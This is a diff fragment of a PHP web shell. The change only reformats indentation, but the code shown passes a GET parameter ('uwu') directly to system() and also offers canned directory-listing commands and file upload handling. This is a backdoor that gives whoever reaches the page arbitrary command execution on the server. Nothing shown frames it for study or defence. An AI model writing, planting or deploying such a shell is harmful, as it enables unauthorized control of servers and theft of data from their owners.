@@ -11,17 +11,17 @@ echo "\033[1;32m[*]\033[1;37m Status : Uploaded \n";
 echo "\033[1;32m[+]\033[1;37m File   : ".$namafile."\n";
 }
 if(isset($_GET['uwu'])){
-	$lel = $_GET['uwu'];
-	echo "".system($lel)."\n";
+    $lel = $_GET['uwu'];
+    echo "".system($lel)."\n";
 }
 if(isset($_GET['dir'])){
-	echo "".system("dir")."\n";
+    echo "".system("dir")."\n";
 }
 if(isset($_GET['ls'])){
-	echo "".system("ls -la")."\n";
+    echo "".system("ls -la")."\n";
 }
 if(isset($_GET['jumpb'])){
-	echo "".system("cd ..")."\n";
+    echo "".system("cd ..")."\n";
 }
 if(isset($_GET['site'])){
     $namafile = $_FILES['anjay']['name'];
